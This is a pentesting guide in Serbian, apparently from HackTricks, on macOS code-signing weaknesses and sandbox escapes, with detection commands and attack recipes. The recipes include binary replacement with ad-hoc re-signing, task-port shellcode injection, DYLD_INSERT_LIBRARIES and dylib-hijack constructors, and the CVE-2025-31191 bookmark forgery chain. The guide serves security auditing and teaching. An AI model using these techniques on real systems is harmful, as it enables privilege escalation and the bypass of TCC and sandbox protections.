# Slabosti Code Signing-a u macOS-u i Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Osnovne informacije

**Ad-hoc signing** (`CS_ADHOC`) kreira code signature bez **certificate chain-a**. I dalje se hash-uje potpisani code, pa validacija može da otkrije izmene, ali ne pruža identitet developera koji drugi component može da autentifikuje. Zamena i ponovno potpisivanje executable-a proizvodi drugačiji CodeDirectory/CDHash.<sup>[[1]](#references)[[4]](#references)</sup>

Na Apple Silicon Mac računarima, svi executable-i zahtevaju najmanje ad-hoc signature. To znači da ćete ad-hoc signatures pronaći u mnogim development alatima, Homebrew paketima i third-party utilities.

### Zašto je ovo važno

- **Nema proverljivog identiteta signera** — provere koje prihvataju samo path, ad-hoc status ili nepinovan identifier ne mogu da utvrde ko je proizveo binary.
- Third-party ad-hoc binaries na **privilegovanim pozicijama** (FDA, daemons, helpers) predstavljaju high-priority targets kada je njihov file ili parent directory writable.
- CDHash, designated-requirement ili requirement-backed TCC check **primećuje** zamenu. Path-based policy možda neće; proverite stvarni requirement i ponovo testirajte grant umesto da pretpostavite da preživljava re-signing.

### Otkrivanje
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Napad: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Procesi koji se mogu debagovati (get-task-allow)

### Osnovne informacije

Entitlement **`com.apple.security.get-task-allow`** (ili zastavica **`CS_GET_TASK_ALLOW`**) omogućava ovlašćenom debuggeru da dobije task port procesa čak i kada bi Hardened Runtime to uobičajeno sprečio. Uspešan debugger može da čita memoriju, menja registre, inject-uje kod i kontroliše izvršavanje.<sup>[[3]](#references)</sup>

Ovo je namenjeno **isključivo development buildovima**. Međutim, neke binarne datoteke trećih strana isporučuju se sa ovim entitlementom u production okruženju.

> [!CAUTION]
> Production binarna datoteka sa `get-task-allow` predstavlja snažan exploitation primitive. `taskgated`, identitet pozivaoca, sandboxing, debugger entitlements i autorizacija za Developer Tools i dalje utiču na to da li određeni klijent može da dobije task port; testirajte i sa `lldb`/`debugserver` i sa predviđenim injectorom. Kada attachment uspe, inject-ovani kod se izvršava sa entitlementima cilja, TCC odobrenjima i bezbednosnim kontekstom.

### Otkrivanje
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Napad: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Bez validacije biblioteka + DYLD okruženje

### Uklanjanje validacije biblioteka tokom izvršavanja

Privatni entitlement **`com.apple.private.security.clear-library-validation`** ne onemogućava library validation pri pokretanju procesa. Umesto toga, procesu omogućava da tokom izvršavanja pozove `csops(..., CS_OPS_CLEAR_LV, ...)` nad samim sobom. XNU tada uklanja `CS_REQUIRE_LV | CS_FORCED_LV`, pod uslovom da pozivalac ima entitlement i ispunjava dodatne provere handlera. Posledično, proces može postati pogodna meta za library injection tek nakon što dođe do code path-a koji uklanja library validation.<sup>[[4]](#references)[[5]](#references)</sup>

### Opasna kombinacija

Kada binarni fajl ima **oba**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (učitava bilo koji dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (prihvata DYLD env varijable)

Ovo je visokovredna kombinacija za code injection, jer Hardened Runtime dozvoljava i nepouzdanu biblioteku i DYLD env varijablu. Launch context i dalje može ukloniti DYLD varijable (na primer, kod zaštićenih ili privilegovanih execution path-ova), zato proverite tačnu invocation umesto da entitlement par smatrate bezuslovnim.

### Otkrivanje
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Napad: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Privremeni izuzeci Sandbox-a

### Kako slabe Sandbox

Privremeni izuzeci Sandbox-a (`com.apple.security.temporary-exception.*`) prave otvore u App Sandbox-u:<sup>[[2]](#references)</sup>

| Izuzetak | Šta omogućava |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Povezivanje sa sistemskim XPC/Mach servisima |
| `temporary-exception.files.absolute-path.read-write` | Čitanje/upisivanje datoteka izvan kontejnera aplikacije |
| `temporary-exception.iokit-user-client-class` | Otvaranje IOKit user-client veza |
| `temporary-exception.shared-preference.read-only` | Čitanje preferencija drugih aplikacija |
| `temporary-exception.files.home-relative-path.read-write` | Pristup putanjama relativnim u odnosu na `~` |

### Mach-Lookup izuzeci = Primitive za Sandbox Escape

Najopasniji izuzetak je **mach-lookup** — omogućava aplikaciji u Sandbox-u da komunicira sa privilegovanim daemon-ima:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attack: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Provere potpisivanja koda nisu integritet XPC klijenta

XPC service može da autentifikuje konekciju izdvajanjem stanja potpisivanja koda iz svog audit tokena i prihvatanjem Apple **platform binary** ili klijenta koji ima `CS_REQUIRE_LV`/`CS_FORCED_LV`. Ove provere opisuju izvršni fajl i odabrane zastavice procesa; one ne dokazuju da trenutni adresni prostor sadrži isključivo pouzdan kod. Istraživanje ImageCapture services pokazalo je da je Apple binary podložan injektovanju, kao što je `/bin/ls`, mogao da učita napadačev dylib kroz `DYLD_INSERT_LIBRARIES` i zatim se poveže kao platform client. Naknadna provera zastavica za library-validation takođe je zaobiđena pre nego što je Apple izmenio service tako da zahteva svoj privatni authorization entitlement u macOS 15.<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. Obrnuti `listener:shouldAcceptNewConnection:` (ili odgovarajući low-level XPC handler) i identifikovati odluke zasnovane isključivo na `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` ili `CS_FORCED_LV`.
2. Nabrojati Apple-signed clients koji mogu da komuniciraju kroz protokol, a zatim proveriti Hardened Runtime i entitlements. Sam platform signature nije dokaz da je DYLD injection blokiran.
3. Testirati kandidata na **target macOS build**. Ako se constructor dylib učita, uspostaviti service connection iz tog constructora tako da audit token pripada prihvaćenom platform process.
4. Ponovo testirati svaku vendor zakrpu: dodavanje još jedne promenljive process-status zastavice istoj authorization odluci možda neće ukloniti confused-deputy primitive.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> Ponašanje DYLD-a, AMFI politika i provere na strani servisa menjaju se između izdanja macOS-a. Neuspeh na potpuno ažuriranom hostu ne dokazuje da je isti lanac neuspešan na ranjivom izdanju.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmarks čuvaju izbor fajla korisnika između pokretanja aplikacije. Sandbox ekstenzija vezana je za pokretanje sistema, pa `ScopedBookmarkAgent` validira tu ekstenziju i kreira dugotrajni bookmark autentifikovan pomoću HMAC-a; kada aplikacija kasnije prosledi taj bookmark, agent ga validira i izdaje novu sandbox ekstenziju. Tajna za potpisivanje čuva se u login keychain-u, a ključ specifičan za aplikaciju izvodi se pomoću identifikatora bundle-a.<sup>[[7]](#references)</sup>

Na pogođenim sistemima, ACL keychain-a sprečavao je nepouzdani proces da **čita** tajnu `com.apple.scopedbookmarksagent.xpc`, ali nije sprečavao njeno brisanje. Kompromitovana sandbox aplikacija mogla je da zameni stavku poznatom tajnom i ACL-om pod kontrolom napadača, izvede HMAC ključ specifičan za aplikaciju, falsifikuje unose u bookmark plist-u kontejnera koji je moguće upisivati i zatraži od `ScopedBookmarkAgent` da ih zameni za ekstenzije za pristup fajlovima. Time je svaka sandbox aplikacija koja koristi security-scoped bookmarks postala potencijalni sandbox escape sa proizvoljnim pristupom fajlovima, bez dodatne interakcije sa biračem fajlova. Apple je rešio problem u bezbednosnim ažuriranjima od 31. marta 2025.<sup>[[7]](#references)</sup>

### Trijaža i lanac napada
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
Sekvenca iskorišćavanja na ranjivom hostu je:

1. Dobijanje izvršavanja koda unutar sandboxed aplikacije koja koristi persistent scoped bookmarks.
2. Zamena signing item-a agenta u keychain-u poznatom tajnom vrednošću i permissive ACL-om.
3. Izračunavanje `HMAC-SHA256(key=known_secret, data=bundle_id)` i falsifikovanje bookmark-a za korisnu putanju u bookmark store-u aplikacije sa dozvolom upisivanja.
4. Pokretanje uobičajenog toka aplikacije za rešavanje bookmark-a, tako da `ScopedBookmarkAgent` vrati sandbox extension.
5. Korišćenje novog pristupa datotekama za prepisivanje out-of-sandbox execution ili data target-a dostupnog tom korisniku.

Ovo je **patched-version technique**: koristite je za razumevanje granice poverenja i procenu unpatched sistema, a ne kao pretpostavku o aktuelnim izdanjima. Za aktuelno testiranje fokusirajte se na parsiranje bookmark-a, vezivanje identiteta, lifecycle keychain item-a i confused-deputy ponašanje povezano sa agentom.

---

## Privatni Apple Entitlements

### Šta su

Entitlements sa prefiksom `com.apple.private.*` omogućavaju pristup **Apple-internim API-jima** koji nisu dokumentovani niti dostupni third-party developerima. Third-party binarije sa private entitlements dobijale su ih putem enterprise cert-a, MDM-a ili distribucije van App Store-a.

### Opasni Private Entitlements

| Entitlement | Mogućnost |
|---|---|
| `com.apple.private.tcc.manager` | Potpuno čitanje/upis u TCC bazu podataka |
| `com.apple.private.tcc.allow` | Pristup određenim TCC servisima |
| `com.apple.private.security.no-sandbox` | Pokretanje bez sandbox-a |
| `com.apple.private.iokit` | Direktan pristup IOKit driver-u |
| `com.apple.private.kernel.\*` | Pristup kernel interfejsu |
| `com.apple.private.xpc.launchd.job-label` | Registrovanje/upravljanje launchd job-ovima |
| `com.apple.rootless.install` | Upis u SIP-om zaštićene putanje |

### Otkrivanje
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Prilagođeni Sandbox profili (SBPL)

### Šta su

Binarni fajlovi mogu sadržati **prilagođene Sandbox profile** napisane u SBPL-u (Seatbelt Profile Language). Ovi profili mogu biti restriktivniji ILI **permisivniji** od podrazumevanog App Sandbox-a.

### Revizija prilagođenih profila
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Putanje biblioteka sa dozvolom upisa

### Šta su

Kada binarni fajl učitava dinamičku biblioteku sa putanje u koju trenutni korisnik može da upisuje, biblioteka može biti zamenjena zlonamernim kodom.

### Otkrivanje
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Napad: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Vodič za potpisivanje koda](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (operacije `CS_OPS_*` i `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (rukovalac za `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [Nova era macOS Sandbox escape-ova: analiza zanemarene površine napada i otkrivanje više od 10 novih ranjivosti](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Analiza CVE-2025-31191: macOS Sandbox escape zasnovan na security-scoped bookmarks](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
